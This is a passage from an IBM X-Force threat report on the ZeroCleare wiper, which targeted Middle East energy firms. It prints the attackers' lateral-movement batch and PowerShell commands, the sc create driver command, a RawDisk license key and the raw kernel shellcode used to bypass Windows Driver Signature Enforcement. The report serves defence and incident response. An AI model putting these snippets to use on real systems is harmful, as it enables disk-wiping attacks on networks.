{
    "id": "4fc2429d-b51a-4b42-ab83-b5aaa424eb90",
    "created_at": "2022-10-25T16:48:10.781277Z",
    "updated_at": "2025-03-27T02:17:27.710926Z",
    "deleted_at": null,
    "sha1_hash": "a93d869bc0d4893c042f91e40e777d72db92a77e",
    "title": "Microsoft Word - New Destructive Wiper ZeroCleare v1 MLM comments.docx",
    "authors": "",
    "file_creation_date": "2019-11-25T18:41:41Z",
    "file_modification_date": "2019-11-25T18:41:41Z",
    "file_size": 694347,
    "plain_text": "# New Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East \n\n#### IBM® X-Force® Incident Response and Intelligent Services (IRIS)\n\n## 2019\n\n\n-----\n\n### Table of Contents\n\n#### New Malware “ZeroCleare” Used in Destructive Attacks _________________________ 3\n\n**1.1 Destructive Attacks – A Rising Concern _________________________________________ 4**\n\n**1.2 ZeroCleare’s General Infection Flow ___________________________________________ 4**\n\n**1.3 Two ZeroCleare Versions, Only One Worked ____________________________________ 5**\n\n**1.4 File #1: ClientUpdate.exe (x64) – aka ZeroCleare ________________________________ 7**\n\n**1.5 File #2: ClientUpdate.exe (x86) – aka ZeroCleare ________________________________ 8**\n\n**1.6 File #3: Soy.exe Analysis ______________________________________________________ 9**\n\n**1.7 Batch Scripts Used by ZeroCleare Attackers ___________________________________ 10**\n\n**1.8 PowerShell Scripts Used by ZeroCleare Attackers ______________________________ 11**\n\n**1.9 ZeroCleare: A Likely Collaboration Between Iranian State Sponsored Groups _____ 20**\n\n**1.10. A New Destructive Wiper Threat in the Wild __________________________________ 21**\n\n**1.11. Energy Sector in the Crosshairs _____________________________________________ 22**\n\n**1.12. Mitigating the Risk Posed by Destructive Malware ____________________________ 23**\n\n#### Annex: IOCs ________________________________________________________________ 25\n\n About IBM X-Force __________________________________________________________ 27\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n## New Malware “ZeroCleare” Used in Destructive Attacks\n\nIBM® X-Force® has been researching and tracking destructive malware in the Middle East,\nparticularly in the industrial and energy sector. Since the first Shamoon attacks that started\naffecting organizations in the region in summer of 2012, we have been following the evolution\nof destructive, disk-wiping malware deployed to cause disruption.\n\nIn recent analysis, X-Force Incident Response and Intelligence Services (IRIS) discovered new\nmalware from the Wiper class, used in a destructive attack in the Middle East. We named this\nmalware “ZeroCleare” per the program database (PDB) pathname of its binary file.\n\nAccording to our analysis, ZeroCleare was used to execute a destructive attack that affected\norganizations in the energy and industrial sectors in the Middle East. Based on the analysis of\nthe malware and the attackers’ behavior, we suspect Iran-based nation state adversaries were\ninvolved to develop and deploy this new wiper.\n\nGiven the evolution of destructive malware targeting organizations in the region, we were not\nsurprised to find that ZeroCleare bears some similarity to the Shamoon malware. Taking a page\nout of the Shamoon playbook, ZeroCleare aims to overwrite the Master Boot Record (MBR) and\ndisk partitions on Windows-based machines. As Shamoon did before it, the tool of choice in the\nattacks is EldoS RawDisk, a legitimate toolkit for interacting with files, disks, and partitions.\nNation-state groups and cyber criminals frequently use legitimate tools in ways that a vendor\ndid not intend to accomplish malicious or destructive activity.\n\nUsing RawDisk with malicious intent enabled ZeroCleare’s operators to wipe the MBR and\ndamage disk partitions on a large number of networked devices. To gain access to the device’s\ncore, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch\nscripts to bypass Windows controls. Adding these ‘living off the land’ tactics to the scheme,\nZeroCleare was spread to numerous devices on the affected network, sowing the seeds of a\ndestructive attack that could affect thousands of devices and cause disruption that could take\nmonths to fully recover from. These tactics resemble the way Shamoon was launched in\nattacks on Arabian Gulf targets in 2018.\n\nX-Force IRIS assesses that the ITG13 threat group, also known as APT34/OilRig, and at least\none other group, likely based out of Iran, collaborated on the destructive portion of the attack.\nX-Force IRIS’s assessment is based on ITG13's traditional mission, which has not included\nexecuting destructive cyber-attacks in the past, the gap in time between the initial access\nfacilitated by ITG13 and the last stage of the intrusion, as well as the different TTPs our team\nobserved.\n\nTo date, X-Force IRIS has not found any previous reporting on the \"ZeroCleare\" wiper, its\nindicators, or elements observed in this campaign. It is possible that it is a recently developed\nmalware and that the campaign we analyzed is one of the first to use this version.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n### 1.1 Destructive Attacks – A Rising Concern\n\nX-Force IRIS has been following a marked increase in destructive attacks in the past year,\nhaving logged a whopping 200 percent increase in the amount of destructive attacks that our\nteam has helped companies respond to over the past six months (comparing IBM incident\nresponse activities in the first half of 2019 versus the second half of 2018).\n\nDestructive attacks on the energy and industrial sectors have been a rising concern, especially\nin countries where the economy relies on oil and gas industries, like in some parts of the\nMiddle East and Europe. While we have seen them more frequently in the Middle East, these\nattacks are not limited to any part of the world and can be launched by any offensive nationstate group seeking to adversely affect the economy of rival countries, or by cybercriminals\nthat use destruction as a pressure tactic.\n\nOverall, destructive attacks we have been seeing affect organizations are being carried out by\nthreat actors of varying motivations who could be employing destructive components in their\nattacks. Some pressure victims to pay them, others counterblow when they are not paid. When\nthese attacks are carried out by nation state adversaries, they often have military objectives\nthat can include accessing systems to deny access to, degrade, disrupt, deceive, or destroy the\ndevice/data.\n\n### 1.2 ZeroCleare’s General Infection Flow\n\nThe ZeroCleare wiper is part of the final stage of the overall attack. It is designed to deploy two\ndifferent ways adapted to 32-bit and 64-bit systems. The general flow of events on 64-bit\nmachines includes using a vulnerable, signed driver and then exploiting it on the target device\nto allow ZeroCleare to bypass the Windows hardware abstraction layer and avoid some\noperating system safeguards that prevent unsigned drivers from running on 64-bit machines.\n\nThis workaround has likely been used because 64-bit Windows based devices are protected\nwith Driver Signature Enforcement (DSE). This control is designed to only allow drivers which\nhave been signed by Microsoft to run on the device. Since ZeroCleare relies on the EldoS\nRawDisk driver, which is not a signed driver and would therefore not run by default, the\nattackers use an intermediary file named soy.exe to perform the workaround. They load a\nvulnerable but signed VBoxDrv driver which the DSE accepts and runs and then exploit it to\nload the unsigned driver, thereby avoiding DSE rejection of the EldoS driver.\n\nOnce loaded, the vulnerable VBoxDrv driver is exploited to run shellcode on the kernel level.\nPost-exploitation, the driver was used to load the unsigned EldoS driver and proceed to the\ndisk wiping phase.\n\nHaving analyzed soy.exe, we determined it was a modified version of the Turla Driver Loader\n(TDL) of which purpose is to facilitate that very DSE bypass.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nThe same process does not apply to the 32-bit systems as they do not limit running unsigned\ndrivers in the same manner.\n\n**Figure 1: ZeroCleare’s Top Level Infection Flow (Source: IBM X-Force)**\n\n### 1.3 Two ZeroCleare Versions, Only One Worked\n\nThe ZeroCleare attack is facilitated by a number of files that each fulfill a different role in the\ninfection chain. Files we analyzed are either scripts or executables designed to spread and\nlaunch the ZeroCleare malware across the targeted infrastructure.\n\nZeroCleare comes in two versions, one for each Windows architecture (32-bit and 64-bit), but\nwhile both exist, only the 64-bit worked. The 32-bit version was supposed to function by\ninstalling the EldoS RawDisk driver as a driver service before beginning the wiping process but\ncaused itself to crash when attempting to access the service during the wiping process.\n\nSince only the 64-bit version worked, the analysis in this paper will refer to that version.\n\n**1.31 Attackers’ File Arsenal**\n\nThe following table lists the files we analyzed as part of what enabled attackers to infect\ndevices with ZeroCleare and spread through compromised networks.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n**Figure 1: ZeroCleare’s Top Level Infection Flow (Source: IBM X-Force)**\n\n\n-----\n\n|Index|File Name|Category|File Hash|Parent|\n|---|---|---|---|---|\n|1|ClientUpdate.exe (x64)|Wiper|1a69a02b0cd10b1764521fec4b7376c9|ClientUpdate.ps1|\n|2|ClientUpdate.exe (x86)|Wiper|33f98b613b331b49e272512274669844|ClientUpdate.ps1|\n|3|elrawdsk.sys (x86)|Tool|69b0cec55e4df899e649fa00c2979661|ClientUpdate.ps1|\n|4|soy.exe|Loader|1ef610b1f9646063f96ad880aad9569d|ClientUpdate.ps1|\n|5|elrawdsk.sys (x64)|Tool|993e9cb95301126debdea7dd66b9e121|soy.exe|\n|6|saddrv.sys|Tool|eaea9ccb40c82af8f3867cd0f4dd5e9d|soy.exe|\n|7|ClientUpdate.txt|PowerShell Script|1dbf3e9c84a89512a52da5b0bb682460|N/A|\n|8|ClientUpdate.ps1|PowerShell Script|08dc0073537b588d40deda1f31893c52|N/A|\n|9|cu.bat|Batch Script|Hash depends on specific deployment|N/A|\n|10|v.bat|Batch Script|Hash depends on specific deployment|N/A|\n|11|1.bat|Batch Script|Hash depends on specific deployment|N/A|\n|12|2.bat|Batch Script|Hash depends on specific deployment|N/A|\n|13|3.bat|Batch Script|Hash depends on specific deployment|N/A|\n|14|4.bat|Batch Script|Hash depends on specific deployment|N/A|\n|15|5.bat|Batch Script|Hash depends on specific deployment|N/A|\n\n\n**Table 1: ZeroCleare attacks: malware and supporting files**\n\nThe following are some overarching notes regarding the file list:\n\n  - The PowerShell and batch scripts analyzed were designed to spread and execute the\nZeroCleare malware across the domain.\n\n  - The main PowerShell script, ClientUpdate.ps1 spreads itself to Domain Controllers\n(DC), and then from those severs. It uses the Active Directory PowerShell module\n**GetADComputer cmdlet to identify lists of target devices to copy and execute the**\n\nmalware on.\n\n  - The Batch scripts support spreading the malware but work in a more simplistic manner\n\nusing premade text files that contain hostnames to infect, rather than generating the\nlists themselves.\n\n  - We found that the ZeroCleare Wiper’s executable itself, delivered in a file named\n**ClientUpdate.exe, ran with a legitimate license key for EldoS RawDisk driver.**\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nThe following sections of this paper provide analysis of the ZeroCleare malware, as well as\ntechnical details on supporting files listed in Table 1.\n\n### 1.4 File #1: ClientUpdate.exe (x64) – aka ZeroCleare\n\n**File name** **Type** **MD5** **Compiled**\n\n**ClientUpdate.exe** 64-bit Windows 1a69a02b0cd10b1764521fec4b7376c9 15 Jun 2019,\n**(x64)** binary 10:47:12\n\nThis file was identified as the new wiper that was deployed in destructive attacks to damage\nWindows-based devices. It was named ZeroCleare by IRIS per the file path of its PDB file.\n\nAs mentioned earlier in this paper, ZeroCleare relies on the legitimate EldoS RawDisk driver\nthat was previously used in Shamoon attacks to access and wipe the hard drive directly. Using\nthis driver, which is an inherently legitimate tool, allows ZeroCleare attackers to bypass the\nWindows hardware abstraction layer and avoid the OS safeguards.\n\nTo install the EldoS RawDisk driver, ZeroCleare uses another binary, Soy.exe, to load the driver\non the targeted device and activate it.\n\nX-Force IRIS analyzed Soy.exe and found that it is a modified version of the Turla Driver Loader\n(TDL), which is designed to bypass x64 Windows Driver Signature Enforcement. The TDL\napplication works by first installing a legitimate but vulnerable, signed, VirtualBox driver,\nvboxdrv.sys (in this case it is named saddrv.sys). Once loaded, this vulnerable driver can be\nexploited to run shellcode at the kernel level, which in this case is used to load the unsigned\nEldoS driver.\n\n**ClientUpdate.exe executes soy.exe via the following command line:**\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|ClientUpdate.exe (x64)|64-bit Windows binary|1a69a02b0cd10b1764521fec4b7376c9|15 Jun 2019, 10:47:12|\n\n\ncmd.exe /c soy.exe\n\n\nIn order to activate the disk management driver, the malware needed to open a file handle via\na unique filename using the logical drive (For example, C:\\). The file name's format requested\nby function CreateFileW must start with # followed by the license key issued to the developer\nby EldoS.\n\nWe have observed ZeroCleare attempt to open the following filename:\n\n\\\\?\\ElRawDisk\\??\\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\nThe license key was:\n\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\nIt could be a temporary license key or one that was stolen from someone else. Various\ninformation stealing malware can obtain license keys from infected systems.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nThe ClientUpdate.exe (x64) wiping function creates a buffer of random bytes and uses function\nDeviceIoControl to send the buffer to the RawDisk driver to write data to the disk and wipe the\nvictim's hard drives. Similar to what the Shamoon malware does, this would overwrite the\nMBR, partitions, and files on the system with random junk data.\n\nThe sample was observed to contain the following PDB string:\n\nC:\\Users\\Developer\\source\\repos\\ZeroCleare\\x64\\Release\\zeroclear.pdb\n\n### 1.5 File #2: ClientUpdate.exe (x86) – aka ZeroCleare\n\n**File name** **Type** **MD5** **Compiled**\n\n**ClientUpdate.exe** 32-bit Windows 33f98b613b331b49e272512274669844 15 Jun 2019,\n**(x86)** binary 11:38:44\n\nSame as ClientUpdate.exe (x64), this file was also identified as the ZeroCleare wiper. As it is\ndesigned for 32-bit Windows systems, Driver Signature Enforcement does not prevent\nunsigned drivers from running. Therefore, this version of ZeroCleare does need to use Soy.exe\nor TDL, the latter being only applicable to 64-bit systems.\n\nClientUpdate.exe (x86) first attempts to install itself as a service by running:\n\n:\\windows\\system32\\cmd.exe /u /c sc create soydsk type= kernel start= demand binPath=\n\n[sample path]\n\nNext, it attempts to activate the disk management device driver by opening a file handle via a\nunique filename using the logical drive (For example, C:\\). The file name's format requested by\nfunction CreateFileW must start with # followed by the license key issued to the developer by\nEldoS. This 32-bit ZeroCleare version attempts to open the following filename:\n\n\\\\?\\ElRawDisk\\??\\(physical drive):#b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf\n3c911e2287a4b906d47d\n\nThe malware uses the same EldoS RawDisk driver license key as observed in the 64-bit\nversion:\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|ClientUpdate.exe (x86)|32-bit Windows binary|33f98b613b331b49e272512274669844|15 Jun 2019, 11:38:44|\n\n\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\n\nThis version did not work properly. During analysis the sample crashed as the disk\nmanagement driver had not been installed and was therefore not accessible. We can theorize\nthat this may be a bug in the code.\n\nX-Force IRIS patched the 32-bit ZeroCleare sample in order to continue the analysis provided\nin this paper. Once it worked, we noted that this version’s wiping behavior was similar to that\nof ClientUpdate.exe (x64), which functioned by creating a buffer of random bytes and used the\nfunction DeviceIoControl to send the buffer to the RawDisk driver to write data that would wipe\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nthe victim's hard drive(s). Similar to what the Shamoon malware does, this would overwrite the\nMBR, partitions, and files on the system with random junk data.\n\nThis file was saved in the following PDB file path:\n\n\nC:\\Users\\Developer\\source\\repos\\ZeroCleare32\\Release\\zeroclear.pdb\n\n\n### 1.6 File #3: Soy.exe Analysis\n\n**File name** **Type** **MD5** **Compiled**\n\n**Soy.exe** 64-bit Windows 1ef610b1f9646063f96ad880aad9569d 15 Jun 2019, 7:04:22\nbinary\n\nThe file soy.exe had a special role in the overall kill chain of ZeroCleare attacks as it was\nnecessary for the initial bypass of Windows OS controls. This file was identified as a\ncustomized version of the Turla Driver Loader (TDL), which is a driver loader application\n_designed for bypassing Windows x64 Driver Signature Enforcement (DSE). DSE is a protective_\nfeature that was introduced in 64-bit versions of Windows 8 and 10, to prevent the loading of\ndrivers unsigned by Microsoft.\n\nTDL works by first loading a legitimate, Microsoft-signed, VirtualBox VBoxDrv driver. However,\na vulnerable version of the driver is intentionally used, and TDL can then exploit the\nvulnerability to run kernel-level shellcode and ultimately load other, unsigned drivers.\n\nThe file sample's resource section includes two encoded resources with the following hashes:\n\n|File name|Type|MD5|Compiled|\n|---|---|---|---|\n|Soy.exe|64-bit Windows binary|1ef610b1f9646063f96ad880aad9569d|15 Jun 2019, 7:04:22|\n\n\nResource ID 1: b1ba74d92395012253b33462c67a726ff266c126f2652092c2f57659d0f46e77\n\n\nResource ID 103: 37680a5a26abc22cde99c5222881a279a04b90680231736efac1e17a8e976755\n\n\nBefore decoding the resources, soy.exe creates a mutex called Ptición de trabajo. It then\nattempts to access its resource section to read encoded resource 103 and uses XOR key\n0XAAAAAAAAAAAAAAAA to decode it. Next, soy.exe writes the decoded content to a 64-bit file\ncalled elrawdsk.sys[1]. This file was identified as the 64-bit version of the EldoS RawDisk driver,\nversion 3.0.31.\n\nAfter that, soy.exe attempts to access resource 1 and uses XOR key 0XFFFFFFFFFFFFFFFF to\ndecode it. The soy.exe sample then writes the decoded content to a 64-bit VirtualBox\nVBoxDrv.sys driver file called saddrv.sys[2], which is known to have privilege escalation and\narbitrary code execution vulnerabilities. This file is a signed driver.\n\nOnce the resources have been decoded, soy.exe tries to create and start a driver service with\nname VBoxDrv and saddrv.sys, in order to load the vulnerable VBoxDrv device driver. At this\n\n1 36a4e35abf2217887e97041e3e0b17483aa4d2c1aee6feadd48ef448bf1b9e6c, driver v3.0.31\n\n2 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986, v1.6\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\npoint, the soy.exe sample uses the Turla Driver Loader (TDL) method to exploit the\nvulnerability in the VirtualBox driver and load and execute the following shellcode:\n\n0x48, 0x8B, 0xC4, 0x41, 0x54, 0x48, 0x81, 0xEC, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x10,\n0x4D, 0x8B, 0xE0, 0x48, 0x89, 0x68, 0x18, 0x48, 0x8D, 0x1D, 0xE2, 0xFF, 0xFF, 0xFF, 0x4C, 0x89,\n0x68, 0xE8, 0x48, 0x81, 0xC3, 0x00, 0x03, 0x00, 0x00, 0x4C, 0x89, 0x70, 0xE0, 0x4C, 0x8B, 0xEA,\n0x4C, 0x89, 0x78, 0xD8, 0x4C, 0x8B, 0xC9, 0x33, 0xC9, 0x41, 0xB8, 0x54, 0x64, 0x6C, 0x53, 0x4C,\n0x63, 0x73, 0x3C, 0x4C, 0x03, 0xF3, 0x45, 0x8B, 0x7E, 0x50, 0x41, 0x8D, 0x97, 0x00, 0x10, 0x00,\n0x00, 0x41, 0xFF, 0xD1, 0x45, 0x33, 0xC9, 0x48, 0x8D, 0xA8, 0x00, 0x10, 0x00, 0x00, 0x48, 0x81,\n0xE5, 0x00, 0xF0, 0xFF, 0xFF, 0x41, 0x83, 0xBE, 0x84, 0x00, 0x00, 0x00, 0x05, 0x0F, 0x86, 0xB0,\n0x00, 0x00, 0x00, 0x41, 0x8B, 0x8E, 0xB0, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00,\n0x00, 0x00, 0x48, 0x89, 0xB4, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x04, 0x0B, 0x41, 0x8B,\n0xB6, 0xB4, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xDD, 0x4D, 0x2B, 0x5E, 0x30, 0x48, 0x89, 0xBC, 0x24,\n0x88, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xF9, 0x85, 0xF6, 0x74, 0x68, 0x0F, 0x1F, 0x44, 0x00, 0x00,\n0x41, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x4D, 0x8D, 0x50, 0x08, 0x45, 0x39, 0x48, 0x04, 0x76, 0x43,\n0x41, 0x0F, 0xB7, 0x02, 0x8B, 0xC8, 0xC1, 0xE9, 0x0C, 0x83, 0xF9, 0x03, 0x74, 0x17, 0x83, 0xF9,\n0x0A, 0x75, 0x22, 0x41, 0x8B, 0x10, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x03, 0x4C,\n0x01, 0x1C, 0x0A, 0xEB, 0x10, 0x41, 0x8B, 0x10, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C,\n0x03, 0x44, 0x01, 0x1C, 0x0A, 0x49, 0x83, 0xC2, 0x02, 0x41, 0x83, 0xC1, 0x02, 0x45, 0x3B, 0x48,\n0x04, 0x72, 0xBD, 0x41, 0x8B, 0x40, 0x04, 0x03, 0xF8, 0x4C, 0x03, 0xC0, 0x3B, 0xFE, 0x72, 0xA0,\n0x45, 0x33, 0xC9, 0x48, 0x8B, 0xB4, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0x88,\n0x00, 0x00, 0x00, 0x49, 0x8B, 0xD7, 0x4C, 0x8B, 0x7C, 0x24, 0x70, 0x48, 0xC1, 0xEA, 0x03, 0x48,\n0x85, 0xD2, 0x74, 0x1D, 0x48, 0x8B, 0xCD, 0x48, 0x2B, 0xDD, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,\n0x48, 0x8B, 0x04, 0x0B, 0x48, 0x89, 0x01, 0x48, 0x8D, 0x49, 0x08, 0x48, 0x83, 0xEA, 0x01, 0x75,\n0xEF, 0x4C, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0x4C, 0x89, 0x8C, 0x24, 0xA0,\n0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x4C, 0x24, 0x48,\n0x0F, 0x57, 0xC0, 0x4C, 0x89, 0x4C, 0x24, 0x50, 0xBA, 0xFF, 0xFF, 0x1F, 0x00, 0xF3, 0x0F, 0x7F,\n0x44, 0x24, 0x60, 0xC7, 0x44, 0x24, 0x40, 0x30, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x58, 0x00,\n0x02, 0x00, 0x00, 0x41, 0x8B, 0x46, 0x28, 0x48, 0x03, 0xC5, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C,\n0x89, 0x4C, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x41, 0xFF, 0xD5, 0x4C, 0x8B, 0x74, 0x24, 0x78, 0x4C,\n0x8B, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48,\n0x8B, 0x9C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x0B, 0x48, 0x8B, 0x8C, 0x24, 0xA0,\n0x00, 0x00, 0x00, 0x41, 0xFF, 0xD4, 0x48, 0x81, 0xC4, 0x90, 0x00, 0x00, 0x00, 0x41, 0x5C, 0xC3\n\n**Figure 2: TDLBootstrapLoader in shellcode format. This code is used to load the elrawdsk.sys driver**\n**into the Windows kernel.**\n\nsoy.exe was also found to contain the following PDB file path:\n\n\nC:\\Users\\[user]\\Desktop\\TDL\\Source\\Furutaka\\output\\x64\\Release\\soy.pdb\n\n\n### 1.7 Batch Scripts Used by ZeroCleare Attackers\nA batch file is a script file that’s typical to DOS, OS/2 and Microsoft Windows. It consists of a\nseries of commands to be executed by the command-line interpreter, stored in a plain text file.\nOn devices running Windows operating systems, a batch file would store commands in serial\norder. ZeroCleare attackers used at least seven batch files in the attack’s flow to add\nfunctionality.\n\n**1.71 v.bat**\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nBatch script v.bat is designed to read a text file containing system hostnames. In this case, the\nfile is called 'listfile.txt' although other names for this file have also been observed.\n\nFor each hostname within the list, the script first copies the contents of directory\n\"C:\\Users\\$USER \\Desktop\\UpdateTemp\" to \"\\\\$hostname\\c$\\Windows\\Temp\" and then attempts\nto run \"cmd /c c:\\Windows\\Temp\\cu.bat\" using Windows Management Interface Command\n(WMIC), which is a simple command prompt tool that returns information about the system\nthat’s running it.\n\n\nfor /F \"tokens=*\" %%A in (listfile.txt) do (\n\n\nxcopy /S /Y \"C:\\Users\\$USER\\Desktop\\UpdateTemp\" \\\\%%A\\c$\\Windows\\Temp && wmic /node:\"%%A\" process call cre\nate \"cmd /c c:\\Windows\\Temp\\cu.bat\"\n\n\n)\n\n\nBatch files 1.bat, 2.bat, 3.bat, 4.bat, and 5.bat appear redundant as they were all identified\nto have the same function as v.bat.\n\n**1.72 Cu.bat**\n\nOnce it is run by its predecessor (v.bat), the batch script cu.bat begins by switching to the\ndirectory C:\\Windows\\Temp. It checks for the existence of '%PROGRAMFILES(X86)%' to determine\nif it is running on a 64- or 32-bit system architecture. It will change to the 'x64' directory as\nneeded, but otherwise the switch proceeds with the 'x86' directory. Once that’s established,\n**cu.bat runs the file .\\ClientUpdate.exe, which is the ZeroCleare malware.**\n\n\ncd c:\\Windows\\Temp\\\n\n\nIF EXIST \"%PROGRAMFILES(X86)%\" (cd .\\x64) ELSE (cd .\\x86)\n\n\n.\\ClientUpdate.exe\n\n### 1.8 PowerShell Scripts Used by ZeroCleare Attackers\n\nPowerShell is a task-based command-line shell and scripting language built on .NET. As such,\nit is part of every Windows operating system. While PowerShell is originally designed to help\nsystem administrators and power-users rapidly automate tasks that manage OS and its\nprocesses, it is also widely used by attackers that rely on ‘living off the land’ tactics.\n\nZeroCleare attackers used some PowerShell scripts in the attack kill chain. Further detail\nfollows.\n\n**1.81 ClientUpdate.ps1**\n\nX-Force IRIS identified two PowerShell scripts with the name ClientUpdate.ps1. The first and\nshorter of the two appeared to be the parent of the second and larger script.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nThe first, short script,[3] takes as its parameter a decryption key and defines a variable\n$ClientData which contains a large quantity of AES-encrypted and Base64-encoded data. The\nscript decodes this data with the decryption key, saves it in the current directory as\n_ClientUpdate.ps1, and executes it using PowerShell.exe. It passes the decryption key as a\nparameter. It then sleeps for 5 seconds before deleting the newly created script file.\n\nWe were able to identify the decryption key from system artifacts and discovered that the\n$ClientData variable contained the larger version of the ClientUpdate.ps1 script.\n\nThe second ClientUpdate.ps1 script[4] is significantly longer and more complex. The overall\npurpose of this script is to spread the ZeroCleare malware as far as it can across the domain.\nThis script sets out to do that by setting up a network of master and slave (agent) systems,\nwith each agent responsible for copying and executing the malware onto a proportion of the\ntarget (client) systems.\n\nDomain controllers were specifically chosen as agents to facilitate the spreading, and the\nActive Directory PowerShell module 'Get-ADComputer' cmdlet was used to assemble lists of\ntarget and client systems.\n\nThe script accepts a large variety of parameters, most of which are optional with the exception\nof Username, Password, and Decryption key.\n\n§ UserName (passed as base64)\n\n§ Password (passed as base64)\n\n§ DECKey (decryption key)\n\n§ CleanUpShareDrives (default: false)\n\n§ DCParent\n\n§ LogPath (default: C:\\Log)\n\n§ MasterSlave\n\n§ AgentMode (false)\n\n§ AgentTimeOut (30)\n\n§ FailedMode (ExchangeSingle or ExchangeSwap)\n\n§ Master\n\n§ RunMode (IMM or SCH)\n\n§ TimeSpan (30)\n\n§ MaxThreads (30)\n\n3 **MD5:08dc0073537b588d40deda1f31893c52**\n\n4 **MD5:15DF71FAD932AE2AE8F162AB0167D71F**\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n§ ClientCheckPort (445)\n\n§ ClientCheckTimeOut (2)\n\n§ ClientForceCopy (false)\n\n§ DCHostName\n\nAn example of the script being run was observed as follows:\n\npowershell.exe -exec bypass -WindowStyle Hidden -NoLogo -file \"C:\\Users\\Public\\Public Updates\\ClientUpdate\n**.ps1\" -Master -RunMode \"IMM\" -TimeSpan 12 -MaxThreads 30 -ClientCheckPort 445 -ClientCheckTimeOut 2 -UserN**\name \"string here\" -Password \"string here\" -DECKey \"abc123\" -ClientForceCopy -CleanUpShareDrives -DCParent\n\"dc01.domain.com\"\n\nThe script is multifunctional and can act in a master or slave capacity depending on the\nparameters originally passed to it.\n\n**Master and Slave Modes**\n\nThe ClientUpdate.ps1 PowerShell script has two main modes of operation:\n\n**1.** **$Master**\n\nIf it is running in $Master mode, the script identifies other domain controllers, then\ncopies and executes the script on those machines in the $Master mode. It identifies all\nnon-DC client/target systems and begins to copy and execute the ClientUpdate.exe\nwiper malware on them, with the other initiated domain controllers doing the same.\n\n**2.** **$MasterSlave**\n\nIn $MasterSlave mode, one domain controller will act as the Master and identify other\ndomain controllers to copy and run the script on them in Agent/Slave mode. The work\nof copying and executing the malware on the client targets is then divided up by the\nmaster and assigned to the agents, who then report back to the master on their\nprogress.\n\nThe way the script is laid out means that the same script can be used by master or agent\nsystems with the parameters determining what function they should be performing.\n\nThe main body of the script performs the following:\n\n  - First it runs the 'Update-DCGPO' function which creates a new GPO to run script\n\nClientUpdateCore.ps1 on startup. The GPO is named \"ClietnUpdate\" (note the\nmisspelling).\n\n  - If parameters $MasterSlave -eq $true -and $AgentMode -eq $false, then run functions:\n\n`o` CleanUp-ShareDrives\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n`o` Start-DCController\n\n  - If parameters $MasterSlave -eq $true -and $AgentMode -eq $true, then run functions:\n\n`o` CleanUp-ShareDrives (only if parameter $CleanUpShareDrives is true)\n\n`o` Start-AgentController\n\n`o` Extract-Self\n\n`o` Execute-Self\n\n  - If parameter $Master -eq $true\n\n`o` CleanUp-ShareDrives\n\n`o` Start-MasterController\n\n`o` Extract-Self\n\n`o` Execute-Self\n\nFurther details of the functions listed above, are presented in the sections below.\n\n**ClientUpdate.ps1: Script’s Notable Functions**\n\n  - CleanUp-ShareDrives\n\n`o` Runs command 'net.exe use * /delete /y' to disconnect all mapped network\n\ndrives\n\n– Start-DCController\n\n`o` Gets a list of all domain controllers for current domain and stores 